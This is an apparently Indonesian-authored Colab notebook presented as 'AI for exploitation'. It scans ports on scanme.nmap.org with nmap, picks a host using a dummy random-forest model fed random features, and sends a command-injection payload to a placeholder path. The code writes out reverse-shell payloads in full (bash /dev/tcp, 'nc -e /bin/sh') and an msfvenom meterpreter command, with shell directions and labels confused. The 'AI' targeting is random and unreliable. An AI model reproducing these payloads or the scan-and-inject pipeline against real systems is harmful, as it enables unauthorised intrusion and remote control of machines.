{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyN2pQ2ZqlRCe6jJyVlYh1aw",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/elangbijak4/Security_Research/blob/main/Tool17_Almudaya_Ai_for_Exploit.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "Kode ini mendemonstrasikan penerapan AI dalam kode eksplotasi"
      ],
      "metadata": {
        "id": "gCbU9eMbbXXS"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "!sudo apt-get update\n",
        "!sudo apt-get install -y nmap"
      ],
      "metadata": {
        "id": "wykBXM49bp8J"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!pip install python-nmap"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "njsaGIcbbqm7",
        "outputId": "5eb71649-723a-4fff-8ae5-bb082bec5f58"
      },
      "execution_count": 4,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Collecting python-nmap\n",
            "  Downloading python-nmap-0.7.1.tar.gz (44 kB)\n",
            "\u001b[2K     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m44.4/44.4 kB\u001b[0m \u001b[31m1.3 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25h  Preparing metadata (setup.py) ... \u001b[?25l\u001b[?25hdone\n",
            "Building wheels for collected packages: python-nmap\n",
            "  Building wheel for python-nmap (setup.py) ... \u001b[?25l\u001b[?25hdone\n",
            "  Created wheel for python-nmap: filename=python_nmap-0.7.1-py2.py3-none-any.whl size=20635 sha256=4f166a33be228b5e15c562b73276edab6319cdf80d3b494bb9cd778e07195e3b\n",
            "  Stored in directory: /root/.cache/pip/wheels/da/bd/c6/0342ac886d4deb8d166a3191eb2566f738c5b1574cb0a8cd62\n",
            "Successfully built python-nmap\n",
            "Installing collected packages: python-nmap\n",
            "Successfully installed python-nmap-0.7.1\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import nmap\n",
        "import requests\n",
        "import random\n",
        "from sklearn.ensemble import RandomForestClassifier\n",
        "import numpy as np"
      ],
      "metadata": {
        "id": "Du0GB883a0HJ"
      },
      "execution_count": 5,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "class NetworkScanner:\n",
        "    def __init__(self):\n",
        "        self.nm = nmap.PortScanner()\n",
        "\n",
        "    def scan(self, target):\n",
        "        self.nm.scan(target, '80,443,445,21,22,23,25,110,143,3306,3389')\n",
        "        return self.nm.all_hosts()"
      ],
      "metadata": {
        "id": "56gx_dvva3q7"
      },
      "execution_count": 6,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "class Exploit:\n",
        "    def __init__(self, target, port, payload_type):\n",
        "        self.target = target\n",
        "        self.port = port\n",
        "        self.payload_type = payload_type\n",
        "\n",
        "    def create_payload(self):\n",
        "        if self.payload_type == \"bind_shell\":\n",
        "            payload = \"bash -i >& /dev/tcp/{}/{} 0>&1\".format(self.target, self.port)\n",
        "        elif self.payload_type == \"reverse_shell\":\n",
        "            payload = \"nc -e /bin/sh {} {}\".format(self.target, self.port)\n",
        "        elif self.payload_type == \"meterpreter\":\n",
        "            payload = \"msfvenom -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} -f exe > meterpreter.exe\".format(self.target, self.port)\n",
        "        else:\n",
        "            payload = \"uname -a\"\n",
        "        return payload\n",
        "\n",
        "    def send_payload(self, payload):\n",
        "        try:\n",
        "            url = f\"http://{self.target}:{self.port}/vulnerable_path\"\n",
        "            params = {\"input\": payload}\n",
        "            response = requests.get(url, params=params)\n",
        "            print(\"Payload sent successfully\")\n",
        "            print(\"Response:\")\n",
        "            print(response.text)\n",
        "        except Exception as e:\n",
        "            print(f\"Failed to send payload: {e}\")"
      ],
      "metadata": {
        "id": "W9uBvbmwa670"
      },
      "execution_count": 7,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "def select_target(hosts):\n",
        "    # Dummy model for illustration purposes\n",
        "    X = np.array([[1, 80], [0, 443], [1, 445], [0, 21], [1, 22]])\n",
        "    y = np.array([1, 0, 1, 0, 1])  # 1 indicates vulnerability, 0 indicates not vulnerable\n",
        "\n",
        "    model = RandomForestClassifier()\n",
        "    model.fit(X, y)\n",
        "\n",
        "    target_features = np.array([[1 if random.choice([True, False]) else 0 for _ in range(2)] for _ in hosts])\n",
        "    predictions = model.predict(target_features)\n",
        "\n",
        "    # Select the most vulnerable target\n",
        "    for i, host in enumerate(hosts):\n",
        "        if predictions[i] == 1:\n",
        "            return host\n",
        "    return None"
      ],
      "metadata": {
        "id": "MgtQQcMma-tx"
      },
      "execution_count": 8,
      "outputs": []
    },
    {
      "cell_type": "code",
      "execution_count": 9,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "9UTnv-9Dauxy",
        "outputId": "dc73b99a-02f2-40fe-94a3-8a9eb89405ef"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Hosts found: ['45.33.32.156']\n",
            "Payload sent successfully\n",
            "Response:\n",
            "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n",
            "<html><head>\n",
            "<title>404 Not Found</title>\n",
            "</head><body>\n",
            "<h1>Not Found</h1>\n",
            "<p>The requested URL /vulnerable_path was not found on this server.</p>\n",
            "<hr>\n",
            "<address>Apache/2.4.7 (Ubuntu) Server at 45.33.32.156 Port 80</address>\n",
            "</body></html>\n",
            "\n"
          ]
        }
      ],
      "source": [
        "if __name__ == \"__main__\":\n",
        "    # Step 1: Scan network\n",
        "    scanner = NetworkScanner()\n",
        "    target = 'scanme.nmap.org'\n",
        "    hosts = scanner.scan(target)\n",
        "    print(f\"Hosts found: {hosts}\")\n",
        "\n",
        "    # Step 2: Select target using AI\n",
        "    target_host = select_target(hosts)\n",
        "    if target_host:\n",
        "        target_port = 80  # Example port for HTTP\n",
        "        payload_type = 'reverse_shell'  # Example payload type\n",
        "        exploit = Exploit(target_host, target_port, payload_type)\n",
        "        payload = exploit.create_payload()\n",
        "        exploit.send_payload(payload)\n",
        "    else:\n",
        "        print(\"No vulnerable targets found.\")"
      ]
    }
  ]
}